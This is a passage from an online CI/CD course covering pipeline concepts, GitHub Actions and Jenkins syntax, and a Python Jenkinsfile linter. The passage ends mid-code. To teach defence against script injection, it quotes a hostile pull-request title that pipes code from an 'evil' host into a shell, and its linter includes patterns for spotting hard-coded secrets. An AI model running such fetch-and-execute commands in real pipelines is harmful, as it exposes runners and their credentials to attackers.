docs.title: CI/CD Mastery Path
docs.text:
Mastery Path BOOTCAMP VINOD BHANUJA

Most CI/CD problems are not exotic. A pipeline that is green because the tests ran in the wrong order. A cache that makes builds fast and wrong. A matrix of 108 jobs that nobody counted. A rename migration that breaks the old version during the deploy. A canary that cannot see a 20% regression. A ${{ github.event.pull_request.title }} pasted into a shell script. None of these are bugs in the tools. They follow from how pipelines actually work, and this course shows each one, with an experiment or a test wherever it could be run.

It assumes you can use Git and a terminal and write small programs. It doesn't assume any CI/CD experience.

Level 1 is the foundation: what CI and CD are, pipeline anatomy, GitHub Actions and Jenkins essentials, testing gates, reproducible builds and caching, artifacts and versioning, secrets, branching and pull-request checks, ending with a local CI runner you can run. Level 2 goes deeper: matrices and parallelism, cache design, reusable pipelines, containers in CI, flaky tests, quality gates, environments and approvals, runners, monorepos and a workflow linter. Level 3 is delivery: deployment strategies, feature flags, database migrations, rollbacks, infrastructure pipelines, GitOps, releases, supply-chain security and DORA metrics, ending with a canary simulator. Level 4 is scale: threat-modelling pipelines, speed and cost, Jenkins and Actions fleets, audit, testing pipelines, incidents, migration, golden paths and a capstone.

Every lesson has a How It Actually Works section: why two identical tarballs have different hashes, why a skipped required check blocks a merge, why 100% coverage can catch nothing, why a pool that is 90% busy makes jobs wait minutes, and why deleting a leaked secret from Git does not un-leak it.

Read this first: what was actually run

This course was written on a Mac with no GitHub Actions account, Jenkins server, Kubernetes cluster or cloud account, so no pipeline here was run on GitHub Actions or Jenkins, and no output is presented as coming from them. What I did instead, and what each lesson labels:

  • Run locally: a 150-line CI runner (minici) that exhibits job ordering, matrices, caches, artifacts and failure propagation; measured experiments with git, tar, pytest and coverage; real SQLite schema-migration experiments; real sockets on loopback; checksum tamper tests; and simulations (flaky-test arithmetic, canary statistics, runner-queue waits) with the model stated and checked against theory where a formula exists.
  • Tested Python tools with pytest suites, 173 tests in all: a Jenkinsfile linter, a secret scanner, a workflow linter, a path-filter mapper, a wait-for-port helper, a canary simulator, a feature-flag evaluator, a GitOps reconciler, an infrastructure plan guard (on hand-written fixtures), a version-bump tool, a DORA calculator, a pipeline performance model, a queue simulator, an audit-log chain, a workflow converter, a golden-path generator and a release-readiness check.
  • Described, not run: GitHub Actions and Jenkins behaviour, environments and approvals, platform caches and limits, Terraform, Argo CD, signing and provenance tools. These come from docs.github.com, jenkins.io and general knowledge as read in October 2026, are marked "not run", and change over time: check current documentation.

Where an experiment gave a result that surprised me (a rollback test I predicted wrongly, a SQLite error when dropping a column, a python3 that was not the interpreter I expected, a tarball whose hash differed because of the gzip header), the lesson says so rather than inventing a clean story.

docs.title: How to use this site
docs.text:
• Get a repository to practise on: a GitHub account with a scratch repository, or a local Jenkins in a container. Never experiment on a pipeline that deploys to something you care about.
  • Read the "what was run" note at the top of each lesson: it tells you whether an output was observed, modelled, or described from documentation.
  • Run the local tools in the src/ folder of the course repository: python3 -m pytest -q src runs all 173 tests; minici.py runs a pipeline on your machine.
  • Do the exercises, especially "predict, then run".
  • Do the projects: each combines its level into a tested tool.

docs.title: Level 1 · Pipeline Foundations
docs.text:
Level 1 builds the mental model: why continuous integration and delivery exist, what a pipeline is made of, how the two dominant systems (GitHub Actions and Jenkins) express the same ideas, how to order testing gates for fast feedback, how reproducible builds and caching work, how artifacts and versions should be handled, how to keep secrets out of trouble, and how branching strategy affects integration. It ends with a small working CI runner.

What was run, and what wasn't

No GitHub Actions runner and no Jenkins server were available, so no workflow or Jenkinsfile was executed by its real system. Their syntax and limits come from official documentation (docs.github.com and jenkins.io, October 2026) and are marked "not run". The concepts are demonstrated with real runs of minici, a local CI runner written for this course (not a clone of either product), with a Jenkinsfile linter, a secret scanner, and measured experiments with git, tar and pytest on macOS. Each lesson says which is which.

Prerequisites: basic Git and a programming language. The GitHub & Git Mastery Path covers repositories, pull requests and Actions in more breadth; the Docker Mastery Path covers containers.

docs.text:

docs.title: 01 · What CI/CD Is and Why Pipelines Exist
docs.text:
Before CI/CD, shipping software looked like this: several people work for weeks on separate branches, someone merges everything the night before a release, the build is broken in five ways nobody anticipated, and deployment is a manual checklist followed at midnight. Continuous integration and continuous delivery exist to make that painful event small, frequent and boring.

About this course and what was run

This course was written on a Mac with no GitHub Actions runner and no Jenkins server available, and no cloud account. So:

  • GitHub Actions and Jenkins syntax (workflow files, Jenkinsfiles, plugin behaviour) comes from their documentation as read in October 2026 and is not run. Where a YAML example is shown, I parsed it with PyYAML to confirm it is well-formed YAML, which does not prove GitHub or Jenkins would accept it. Documented limits quoted for GitHub-hosted runners come from the GitHub Actions limits page.
  • The ideas (stages, dependencies, matrices, caches, artifacts, gates, deployment strategies) are demonstrated with real runs of minici, a small local CI runner I wrote for this course (about 150 lines of Python, 15 passing tests). It is a teaching tool. It is not GitHub Actions or Jenkins and does not behave identically; where I say "a real system does X", that is documentation, not something minici proves.
  • Statistics about industry practice are not quoted: I have no source I verified, so none appear.

You can try every GitHub Actions example for free in a public repository, and Jenkins runs in a container or from its WAR file.

docs.title: The three terms
docs.text:
Term What it means What it needs Continuous Integration (CI) Developers merge small changes into a shared mainline frequently, and every change is automatically built and tested A build that runs without human steps, tests worth trusting, a rule that a broken mainline is fixed first Continuous Delivery Every change that passes the pipeline is kept in a deployable state and can be released to production at any time with one decision Automated packaging, deployment to staging, repeatable release steps Continuous Deployment Every passing change is released to production automatically, with no manual gate High-confidence tests, monitoring, fast rollback, feature flags

Delivery is "we could ship now"; deployment is "we did ship". Plenty of teams stop at delivery on purpose (regulation, customer release cycles), and that is a legitimate choice.

docs.title: The problems it addresses
docs.text:
1. Integration pain grows with time. Two developers change the same code for a month; the merge takes days. Merging small changes daily keeps conflicts small and the cause obvious.
  2. "Works on my machine." A pipeline builds from a clean environment, so hidden dependencies on someone's laptop get exposed immediately.
  3. Late feedback is expensive. The sooner a defect is found after it was introduced, the cheaper it is to fix: the author still remembers the change, and nothing else has been built on it. A pipeline's job is to shrink the time between "I broke it" and "I know".
  4. Manual release steps are error-prone. A runbook of 30 manual steps has a failure rate per step; automating them makes the 31st release identical to the first.
  5. Big releases are risky. A deployment containing three months of changes is hard to test and hard to roll back. A deployment containing one change is easy to reason about.

docs.title: What a pipeline actually is
docs.text:
A pipeline is an automated, versioned recipe that turns a commit into evidence and artifacts: Does it build? Do the tests pass? Is it safe and compliant? Can it be packaged? Does it run in a production-like environment? Each step either produces a result or stops the line.

commit/push ─► build ─► test ─► scan ─► package ─► deploy to staging ─► verify ─► (approval) ─► deploy to production ─► monitor
    └────────── continuous integration ───────────┘└────────────── continuous delivery / deployment ──────────────┘

Three properties make it useful: it's automatic (nobody remembers to run it), repeatable (same inputs, same steps, same result), and visible (everyone sees red or green and the logs behind it).

docs.title: A first look (run)
docs.text:
The minici runner executes a pipeline file with five jobs: dependencies, a syntax check, tests in three time-zone variants, packaging, and a simulated deploy. First run, abridged to the interesting lines:

[deps] step 1 'install dependencies (slow step, 2 s)': ok
    | installed
[test {"tz": "UTC"}] step 1 'tests under UTC': ok
    | 3 passed in 0.00s
[package] step 1 'build artifact': ok
[deploy] step 1 'deploy (simulated)': ok
    | deploying app-1.0.0.tar.gz
RESULT: success

The pipeline ran the dependency install and the lint in parallel, waited for both before starting the three test variants in parallel, and only then packaged and "deployed". Stages are ordered by dependencies (needs), not by position in a file. The next lessons dissect exactly this.

docs.title: What CI/CD is not
docs.text:
• Not a tool. GitHub Actions, Jenkins, GitLab CI and others are implementations of a practice. Buying one doesn't give you CI if developers merge once a month or the tests are unreliable.
  • Not a substitute for tests. A pipeline runs your checks; it can't create confidence you didn't build.
  • Not only about deploying. Fast, trustworthy feedback on every change is the part teams benefit from first.
  • Not free of risk. Pipelines hold credentials and run code, so they are themselves a prime attack surface (Level 4 · 01).

docs.title: Principles to carry through the course
docs.text:
1. Keep the mainline releasable. If main is red, fixing it is the top priority.
  2. Build once, deploy many. Create one artifact and promote the same artifact through environments (Lesson 07); don't rebuild per environment.
  3. Fail fast and cheap first. Run quick checks (lint, unit tests) before slow ones (integration, end-to-end).
  4. Make the pipeline code. It lives in version control, is reviewed, and changes with the software.
  5. Everything the pipeline needs is declared: dependencies, tool versions, environment, secrets references.
  6. Fast feedback beats exhaustive feedback. Aim for the first signal in minutes; run the long tail in parallel or later stages.
  7. Observe the pipeline itself: duration, failure rate, flakiness (Level 2 · 05), and the DORA measures (Level 3 · 09).

docs.title: How It Actually Works
docs.text: Under every CI system the mechanism is the same: an event (a push, a pull request, a schedule, a manual click) reaches an orchestrator that reads the pipeline definition from the repository, builds a graph of jobs, and assigns each ready job to an executor (a runner or agent: a VM, container or bare machine). The executor checks out the code at the exact commit, runs the steps in a clean workspace, streams logs back, and reports success or failure, optionally storing artifacts and caches. The orchestrator uses the results to decide what runs next and to update the status shown on the commit or pull request. minici implements precisely that loop in miniature: topological ordering, parallel execution of independent jobs, step-level pass/fail, and skipping dependents of a failed job.

docs.title: Common mistakes
docs.text:
• Treating CI as a build server nobody watches, so red builds stay red.
  • Long-lived feature branches that defeat integration frequency.
  • A pipeline so slow that people stop waiting for it and merge anyway.
  • Tests that pass or fail randomly, teaching the team to ignore failures (Level 2 · 05).
  • Rebuilding separately for each environment, so what you tested isn't what you shipped.
  • Pipeline logic hidden in the CI tool's web UI instead of versioned files.
  • Automating a broken manual process without fixing it first.

docs.title: Exercise
docs.text:
1. Write down your team's (or a project's) path from commit to production as a numbered list, marking each step manual or automatic, and note where the longest waits are.
  2. Classify your current setup as CI only, continuous delivery, or continuous deployment, and name the single change that would move it one step along.
  3. Run minici on the demo project (in the course repository's src/ folder) twice, and compare the two summaries: what changed and why?
  4. Pick one recent bug and estimate how long it lived between being introduced and being found. What pipeline stage could have caught it?

docs.title: 02 · Pipeline Anatomy: Triggers, Jobs, Steps & Stages
docs.text:
Every CI system uses different words, but the structure underneath is the same. Learn the structure once and GitHub Actions, Jenkins, GitLab CI and the rest become dialects. This lesson names the parts and demonstrates the control flow by running a small pipeline.

What was run

The pipeline runs below used minici (this course's local runner, not GitHub Actions or Jenkins; see Lesson 01). The vocabulary table for GitHub Actions and Jenkins is from their documentation as of October 2026 and is not run. See Lesson 01 for the full note.

docs.title: The vocabulary, side by side
docs.text: Concept Meaning GitHub Actions Jenkins (Declarative) minici Pipeline / workflow The whole automated process, defined as code A workflow file in .github/workflows/ A Jenkinsfile A YAML file Trigger The event that starts a run on: (push, pull_request, schedule, workflow_dispatch...) SCM polling/webhooks, triggers {}, "Build now" You run the command Job A unit of work on one executor, with its own clean workspace jobs.<id> A stage (with its own agent if declared) jobs.<id> Step One command or reusable action inside a job steps: (run or uses) steps {} (sh, bat, plugin steps) steps: with run Stage A named phase grouping work (build, test, deploy) Not a first-class concept; jobs and needs express it stage('Build') Levels computed from needs Runner / agent The machine or container that executes jobs runs-on: agent {} Your laptop Dependency Order between jobs needs: Sequential stages; parallel {} blocks needs: Condition Whether something runs if: when {} if: Artifact Files produced for later use or download upload/download artifact actions archiveArtifacts artifacts: Cache Reusable files to speed up later runs cache action plugins or agent-local caches cache: Environment / secrets Variables, protected targets env, secrets, environment: environment {}, credentials binding env:

docs.title: Triggers
docs.text:
A pipeline should start for a reason you can name. Common triggers:

  • Push to specific branches (main, release branches), maybe filtered by paths (Level 2 · 09).
  • Pull request opened or updated: the single most valuable trigger, because it gives feedback before merging.
  • Schedule (cron): nightly builds, dependency audits, long-running tests (Level 1 · cron semantics from the Linux course apply, including UTC).
  • Manual (workflow_dispatch in Actions, "Build with parameters" in Jenkins): deploys, hotfixes, one-off tasks.
  • Tag push: release builds (Lesson 07).
  • Another pipeline finishing, or a webhook from an external system.

Be deliberate about which events can reach secrets or deploy: pipelines triggered from forks of public repositories are a classic security boundary (Level 4 · 01).

docs.title: Jobs, steps and the workspace
docs.text:
A job gets a fresh workspace: a clean checkout of the code at the triggering commit, on a clean runner. Nothing from a previous job is there unless you pass it explicitly via artifacts or a cache (Lessons 06 and 07). That is a feature: it forces your build to declare what it needs. Steps within one job share that job's filesystem and run in order; if a step exits non-zero, the job fails and later steps are skipped unless told otherwise (a cleanup step typically has a failure()/always() condition).

The unit of success is the exit code: 0 passes, anything else fails. This is why a step like pytest gates a pipeline without any special integration, and why a shell step like cmd1 | cmd2 can hide a failure unless pipefail is set (Linux course, Level 4 · 01). minici runs every run: script with set -eo pipefail for this reason.

docs.title: Dependencies form a graph
docs.text:
Jobs with no dependency between them run in parallel; a job with needs: [a, b] waits for both. The pipeline is a directed acyclic graph (DAG). A small pipeline run locally:

jobs:
  build:   {steps: [{name: compile,            run: "echo compiling; exit 0"}]}
  test:    {needs: [build],   steps: [{name: unit tests, run: "echo 2 failed; exit 1"}]}
  package: {needs: [test],    steps: [{name: package,    run: "echo packaging"}]}
  report:  {needs: [test], if: "always()", steps: [{name: publish test report, run: "echo uploading report anyway"}]}
  docs:    {steps: [{name: build docs,         run: "echo docs ok"}]}

Run (macOS, minici):

levels computed from needs: [['build', 'docs'], ['test'], ['package', 'report']]
[build] step 1 'compile': ok
[docs] step 1 'build docs': ok
[test] step 1 'unit tests': FAILED rc=1
    | 2 failed
[package] skipped (a needed job did not succeed)
[report] step 1 'publish test report': ok
RESULT: failure

What the output demonstrates:

  1. build and docs ran in the same level (parallel) because neither needs the other.
  2. test failed, so package was skipped: a job whose dependency failed does not run (the default behaviour in both Actions and Jenkins's sequential stages).
  3. report ran anyway because it has if: always(). Reporting, notifications and cleanup are the classic uses.
  4. The overall run is failure, even though three of the four executed jobs passed. The status line on the pull request should reflect the worst result.

docs.title: Conditions and outputs
docs.text: Real systems let steps and jobs run conditionally: only on the main branch, only when certain files changed, only on tags. Jobs pass small values to later jobs through outputs (a version string computed in one job and used in another), and larger data through artifacts. In GitHub Actions, contexts such as github.ref, github.event_name and matrix.* are available inside ${{ }} expressions; in Jenkins, env.BRANCH_NAME and when { branch 'main' } play that role. Keep conditions simple: complicated boolean logic in pipeline YAML is hard to read and test.

docs.title: Stages as a mental model
docs.text:
Even where the tool has no "stage" keyword, think in stages with increasing cost and confidence:

1. Fast checks      format, lint, type check, unit tests         seconds to a few minutes
2. Build & package  compile, build artifact/container image       minutes
3. Slow checks      integration, security scans, end-to-end        minutes to tens of minutes
4. Deploy to staging, smoke tests                                  minutes
5. Release gate     approval and/or automated checks               variable
6. Production       deploy, verify, monitor                        minutes

Earlier stages should be cheaper and more likely to fail; this ordering lowers average feedback time (Lesson 05).

docs.title: Idempotence, timeouts and concurrency
docs.text:
• Idempotent steps: re-running a failed pipeline should be safe. A deploy that appends configuration each run is a bug waiting for a retry.
  • Timeouts: every job and step needs one, so a hung process does not hold a runner for hours. GitHub-hosted runners terminate any job after 6 hours (documented limit), which is far too long to be a useful timeout. minici supports per-step timeouts (a test with a 1 s timeout and sleep 5 is killed and reported as timed out).
  • Concurrency control: two deploys to the same environment at once are dangerous. Systems offer concurrency groups (Actions concurrency:) or locks (Jenkins lockable resources plugin) so a second run waits or replaces the first.

docs.title: How It Actually Works
docs.text: The orchestrator parses the pipeline definition into a graph, then repeatedly picks jobs whose dependencies are all finished and successful (or whose condition allows running), and dispatches them to free executors. Each executor prepares a workspace (checkout), runs steps by spawning a shell or container for each, captures output, and returns exit status. minici does this with topo_levels (grouping jobs whose needs are satisfied), one thread per job in a level, and subprocess.run per step with a timeout. Status propagation is simple: a job is skipped if any dependency's result is not success (unless if: always()), and the run is a success only if every job succeeded or was deliberately skipped.

docs.title: Common mistakes
docs.text:
• No timeouts, so hung jobs consume runners.
  • Assuming files persist between jobs.
  • Exit codes swallowed (|| true, pipes without pipefail, commands that print "FAILED" but exit 0).
  • A deploy job without concurrency protection.
  • Everything in one giant job, so nothing runs in parallel and a retry repeats all the work.
  • Conditions that skip security checks on some branches.
  • Treating "skipped" as success in required-check rules (a skipped required check can unintentionally let a pull request merge in some configurations; check your platform's behaviour).

docs.title: Exercise
docs.text:
1. Draw the DAG for a pipeline you know (jobs and needs). Where is the critical path, and which jobs could run in parallel but do not?
  2. Modify the example so package still runs when only docs fails but not when test fails. What needs and if do you need?
  3. Add a step that exits 0 even though a command inside a pipe failed, then fix it with pipefail, and describe how you would catch this class of bug in review.
  4. Look up the trigger syntax for your CI system and write down which events would start a run for (a) a pull request from a fork, (b) a push to main, (c) a tag.

docs.title: 03 · GitHub Actions Essentials
docs.text:
GitHub Actions is the CI/CD system built into GitHub: pipelines are YAML files in .github/workflows/, triggered by repository events, run on GitHub-hosted or self-hosted runners. This lesson covers the parts you need to read and write real workflows; the full feature tour (Marketplace, packages, Pages, issue automation) belongs to the GitHub & Git Mastery Path, which this course does not duplicate.

What was run

No workflow below was run on GitHub; there was no repository or runner in this environment. The syntax comes from the GitHub Actions documentation (docs.github.com, October 2026), and the numeric limits I quote come from its "Actions limits" page. What I did run: PyYAML parsed the example workflow (it is well-formed YAML), which surfaced the YAML 1.1 gotcha described below; I did not validate it against GitHub's schema (a tool such as actionlint would, but I did not run one). Action version tags (@v4, @v5) are as I knew them and change over time; check the current major versions. See Lesson 01.

docs.title: A complete workflow
docs.text:
name: ci
on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    strategy:
      fail-fast: false
      matrix:
        python: ["3.11", "3.12"]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
          cache: pip
      - run: pip install -r requirements.txt
      - run: python -m pytest -q
  package:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - run: tar -czf app.tar.gz app
      - uses: actions/upload-artifact@v4
        with:
          name: app
          path: app.tar.gz

Reading it top to bottom:

  • on: lists triggers: pushes to main, any pull request, and manual runs (workflow_dispatch). Other events include schedule, release, workflow_call (reusable workflows; Level 2 · 03) and many repository events.
  • permissions: contents: read restricts the automatic GITHUB_TOKEN to read-only access to repository contents. Set this explicitly. Without it the token's default permissions depend on repository/organization settings and may be broader than you want; least privilege is the rule (Level 4 · 01).
  • concurrency puts runs of the same workflow and ref in one group; cancel-in-progress: true cancels the older run when a newer push arrives, saving runner minutes on rapid pushes. Do not cancel in-progress deployments this way.
  • jobs.test runs on a GitHub-hosted ubuntu-latest runner with a timeout-minutes: 15. The default job limit on GitHub-hosted runners is 6 hours (documented), so always set something smaller. strategy.matrix creates one job per Python version, and fail-fast: false lets the other versions finish when one fails (the default is true, cancelling the rest; Level 2 · 01).
  • steps: uses: runs a reusable action (actions/checkout fetches the code, actions/setup-python installs Python and, with cache: pip, caches dependencies); run: runs a shell command. Each step's exit code decides pass/fail.
  • needs: test orders package after all matrix jobs of test; if: github.ref == 'refs/heads/main' limits packaging to the main branch.
  • actions/upload-artifact stores app.tar.gz so it can be downloaded or used by a later job or workflow (Lesson 07).

docs.title: Contexts and expressions
docs.text:
${{ ... }} evaluates expressions against contexts: github (event, ref, sha, actor), env, secrets, vars, matrix, needs (outputs from earlier jobs), runner, job, steps. Examples: ${{ github.sha }}, ${{ secrets.DEPLOY_TOKEN }}, ${{ needs.build.outputs.version }}. Functions include contains(), startsWith(), hashFiles() (used for cache keys; Lesson 06), and status checks success(), failure(), always(), cancelled().

Injection warning: never put untrusted event data (a pull request title, branch name, issue body) directly into a run: script via ${{ }}; the expression is substituted before the shell sees it, so a title like "; curl evil | sh becomes part of the script. Pass it through an environment variable and reference the variable instead (env: TITLE: ${{ github.event.pull_request.title }}, then "$TITLE"). Level 2 · 10 builds a linter that flags this.

docs.title: Documented limits worth knowing (GitHub "Actions limits" page, October 2026)
docs.text:
Limit Value Job execution time, GitHub-hosted runners 6 hours (the job is terminated) Job execution time, self-hosted runners 5 days Jobs generated by one matrix 256 per workflow run Workflow run time (including waiting and approvals) 35 days Time a run can wait for an environment approval 30 days Re-runs of one workflow run 50 Cache storage per repository 10 GB Concurrent jobs (standard hosted runners) Depends on plan: 20 (Free), 40 (Pro), 60 (Team), 500 (Enterprise)

These change; check the page before designing around them. Artifact and minute allowances also vary by plan.

docs.title: The YAML 1.1 gotcha, found by parsing
docs.text:
When I parsed the workflow with PyYAML to check it, the top-level keys came back as:

['name', True, 'permissions', 'concurrency', 'jobs']

The key on became the boolean True. YAML 1.1 treats the bare words on, off, yes and no as booleans (yaml.safe_load("a: on b: yes c: no d: 'on'") gave {'a': True, 'b': True, 'c': False, 'd': 'on'}; only the quoted 'on' stayed a string). GitHub's own parser handles on correctly, so your workflow is fine, but any script that reads workflow files with a YAML 1.1 library must look for True as well as "on" (the linter in Level 2 · 10 does). The same trap bites version strings: python: [3.10] is the float 3.1, which is why the example quotes "3.11" and "3.12"; and country code NO becomes False. Quote strings that could be misread.

docs.title: Running the same job locally
docs.text: A workflow's real work should be a command you can run on your laptop (make test, ./ci.sh, python -m pytest), with the workflow only wiring triggers, caching and credentials around it. Then a failing pipeline is reproducible, and moving between CI systems (Level 4 · 08) is cheap. Tools like act try to run workflows locally in containers; I did not use it, and it does not match GitHub's runners exactly.

docs.title: How It Actually Works
docs.text: When an event matches a workflow's on: filter, GitHub creates a run, evaluates job dependencies and conditions, and queues each ready job for a runner with the requested label (ubuntu-latest selects a GitHub-hosted VM image; self-hosted labels select your machines). The runner downloads the job's steps, creates a fresh workspace, and for each uses: step fetches the referenced action at its tag/SHA and executes it (JavaScript, Docker or composite), for each run: step spawns the shell. The runner streams logs back, evaluates if: and exit codes, and uploads artifacts and caches to GitHub's storage. The GITHUB_TOKEN is a short-lived credential minted per run with the permissions you declared. Because each job gets a clean VM, nothing persists between jobs except artifacts, caches and outputs.

docs.title: Common mistakes
docs.text:
• No permissions: block, leaving broader token rights than needed.
  • No timeout-minutes, so a hang burns up to 6 hours.
  • Unquoted version numbers and booleans in YAML.
  • Untrusted event fields inside run: expressions (script injection).
  • cancel-in-progress on deploy jobs.
  • Third-party actions pinned to a mutable tag (Level 3 · 08).
  • Putting all logic in workflow YAML instead of scripts that run locally.
  • Using pull_request_target carelessly (it runs with secrets in the base repository's context; treat checkout of fork code there as dangerous).

docs.title: Exercise
docs.text:
1. Write a workflow for a project you know that runs tests on push and pull request, with permissions, timeout-minutes and concurrency. Parse it with PyYAML to confirm it is valid YAML, and note the True key.
  2. Add a manual-dispatch input (workflow_dispatch.inputs) that selects a target environment, and use it in an if: expression.
  3. Rewrite a step that interpolates a pull request title into a shell command so it uses an environment variable instead.
  4. Read the "Actions limits" page and compute how many matrix combinations you could create for three operating systems and five language versions with two extra flags (and whether it fits the 256-job limit).

docs.title: 04 · Jenkins Essentials and the Jenkinsfile
docs.text:
Jenkins is the long-running open-source automation server. It predates hosted CI services, runs on your own infrastructure, and has a huge plugin ecosystem. It remains common in organisations that need to run builds inside their network or on specialised hardware. Its pipelines are written in a Jenkinsfile stored with the code.

What was run

No Jenkins server was run for this course (none was installed, and I did not download one), so no Jenkinsfile below was executed by Jenkins. Syntax and semantics come from the Jenkins Pipeline Syntax reference (jenkins.io, October 2026). What I ran: a structure linter I wrote for Declarative Jenkinsfiles, with 11 passing pytest tests. It is text-based and does not understand Groovy; Jenkins's own validator is the authority. See Lesson 01.

docs.title: Architecture in one picture
docs.text:
developers push → SCM (Git) ──webhook──► Jenkins controller  ──schedules──►  agents (nodes) run the builds
                                         (UI, job config, plugins,             (labels: linux, docker, windows, gpu...)
                                          queue, credentials store)
  • The controller hosts the web UI, stores job definitions and credentials, decides what runs where, and keeps build records. Keep builds off the controller (set it to zero executors): a build that runs on the controller can read everything the controller holds, including credentials (Level 4 · 01).
  • Agents (nodes) execute the work: permanent machines, cloud-provisioned VMs, or containers/pods created on demand. Jobs select agents by label.
  • Plugins add SCM integrations, build steps, credentials types and agent provisioning. They are also the main operational burden: each is code running inside the controller with its own security fixes (Level 4 · 03).

docs.title: The Declarative Jenkinsfile
docs.text:
pipeline {
    agent { label 'linux && docker' }
    options {
        timeout(time: 30, unit: 'MINUTES')
        timestamps()
        disableConcurrentBuilds()
        buildDiscarder(logRotator(numToKeepStr: '30'))
    }
    environment {
        APP_VERSION = "1.4.${env.BUILD_NUMBER}"
    }
    stages {
        stage('Checkout') {
            steps { checkout scm }
        }
        stage('Build and Test') {
            parallel {
                stage('Unit tests') {
                    steps { sh 'python3 -m pytest -q' }
                }
                stage('Lint') {
                    steps { sh 'python3 -m py_compile app/*.py' }
                }
            }
        }
        stage('Package') {
            steps {
                sh 'tar -czf app-${APP_VERSION}.tar.gz app'
                archiveArtifacts artifacts: 'app-*.tar.gz', fingerprint: true
            }
        }
        stage('Deploy to staging') {
            when { branch 'main' }
            steps {
                withCredentials([string(credentialsId: 'staging-deploy-token', variable: 'TOKEN')]) {
                    sh './deploy.sh staging "$TOKEN"'
                }
            }
        }
    }
    post {
        always { junit allowEmptyResults: true, testResults: 'reports/*.xml' }
        failure { echo 'Build failed: notify the team' }
    }
}

Reading it:

  • agent { label 'linux && docker' } requests a node with both labels. agent any runs on any node, which is rarely what you want. Per the reference, the top-level agent is required, and a stage can declare its own agent (including a Docker image) for different tools.
  • options: timeout(...) bounds the run (note from the reference: for a top-level agent, the timeout counter starts after the agent is allocated, so waiting for a node isn't counted); timestamps() stamps log lines; disableConcurrentBuilds() stops two builds of this job running at once (important for deploys); buildDiscarder limits retained history. The reference also documents parallelsAlwaysFailFast().
  • environment defines variables, here using the built-in env.BUILD_NUMBER.
  • stages / stage / steps: stages run in order; parallel { } runs nested stages concurrently. checkout scm fetches the exact commit that triggered the build. sh runs a shell command and fails the stage on a non-zero exit.
  • archiveArtifacts ... fingerprint: true stores build outputs and records their checksums so other jobs can trace where a file came from.
  • when { branch 'main' } restricts the deployment stage (branch-based conditions need a multibranch pipeline job).
  • withCredentials binds a stored secret to a variable only for the enclosed block; Jenkins masks the value in logs. The script is single-quoted so the shell, not Groovy, expands $TOKEN, avoiding the secret being interpolated into a Groovy string.
  • post: always, failure, success and other conditions run after the stages: test-report publishing, notifications, cleanup.

Declarative is the recommended style for most pipelines; Scripted Pipeline (node { ... } with full Groovy) offers flexibility at the cost of readability and weaker validation. Use the script { } step inside declarative for small amounts of Groovy.

docs.title: Jenkins vs GitHub Actions in one table
docs.text:
Jenkins GitHub Actions Hosting You run controller and agents GitHub runs the orchestrator; hosted or self-hosted runners Pipeline file Jenkinsfile (Groovy DSL) YAML in .github/workflows Extensibility Plugins (installed on the controller) Marketplace actions (executed per job) Isolation Depends on how you configure agents; shared controller Fresh VM per job on hosted runners Maintenance burden Upgrades, plugin updates, backups, scaling Mostly the workflows themselves Strengths Full control, on-prem, custom hardware, mature, flexible Tight GitHub integration, low setup, ecosystem Typical weakness Plugin sprawl, snowflake controllers Locked to GitHub, usage limits

Neither is "better"; the right choice depends on where your code and builds must live. Migrating between them is Level 4 · 08.

docs.title: A Jenkinsfile linter (run)
docs.text:
Jenkins can validate a Declarative Jenkinsfile through its linter endpoint; I could not use that, so I wrote structure checks that catch common problems without a server:

"""Structure checks for Declarative Jenkinsfiles. Text-based, with a brace tokenizer; it does not understand Groovy and cannot replace
Jenkins' own validator (`Jenkinsfile Linter` endpoint / `declarative-linter`). Findings are advisory."""
import re, sys

def strip_comments_and_strings(text):
    text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
    text = re.sub(r"(^|[^:])//[^\n]*", r"\1", text)
    return re.sub(r"'(?:\\.|[^'\\])*'|\"(?:\\.|[^\"\\])*\"", '""', text)

def balanced(text):
    depth = 0
    for ch in strip_comments_and_strings(text):
        depth += ch == "{"; depth -= ch == "}"
        if depth < 0: return False
    return depth == 0

def block_names(text):
    return re.findall(r"\b(pipeline|agent|options|environment|stages|stage|steps|post|parallel|when|always|failure|success|tools|triggers|parameters)\b\s*[({]", strip_comments_and_strings(text))

def lint(text):
    problems = []; clean = strip_comments_and_strings(text); raw_no_comments = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
    if not balanced(text): problems.append("unbalanced braces: the file will not parse"); return problems
    names = block_names(text)
    if "pipeline" not in names: problems.append("no declarative 'pipeline { }' block (scripted pipelines need different checks)")
    if "agent" not in names and not re.search(r"\bagent\s+(any|none)\b", clean): problems.append("missing required 'agent' section")
    if "stages" not in names: problems.append("missing required 'stages' section")
    if names.count("stage") == 0: problems.append("no stage blocks")
    if re.search(r"\bagent\s+any\b", clean): problems.append("'agent any' lets the build run on any node; use labels so builds land on suitable, trusted agents")
    if "timeout(" not in clean: problems.append("no timeout() option: a hung build occupies an executor indefinitely")
    if "post" not in names: problems.append("no post { } section for always/failure handling (reports, notifications, cleanup)")
    if "disableConcurrentBuilds" not in clean: problems.append("concurrent builds are allowed; consider disableConcurrentBuilds() for jobs that deploy")
    if "buildDiscarder" not in clean: problems.append("no buildDiscarder: build history and artifacts will accumulate on the controller")
    for m in re.finditer(r"(password|passwd|secret|token|apikey|api_key)\s*[=:]\s*['\"][^'\"$]{6,}['\"]", raw_no_comments, re.I):
        problems.append(f"possible hard-coded credential: {m.group(0)[:40]}...; use credentials() / withCredentials")
    if re.search(r"sh\s+['\"][^'\"]*\$\{?[A-Za-z_]*(TOKEN|PASSWORD|SECRET)", raw_no_comments) : problems.append("secret interpolated into an sh string; single-quote the script and let the shell read the environment variable (avoids Groovy string interpolation leaks)")
    for m in re.finditer(r"stage\(\s*['\"]([^'\"]*)['\"]\s*\)\s*\{", raw_no_comments):
        if re.search(r"deploy|release|publish", m.group(1), re.I):
            body = raw_no_comments[m.end(): m.end() + 600]
            if not re.search(r"\bwhen\s*\{", body.split("stage(")[0]): problems.append(f"stage {m.group(1)!r} looks like a deployment but has no 'when' condition: it would run on every branch")
    return problems

if __name__ == "__main__":
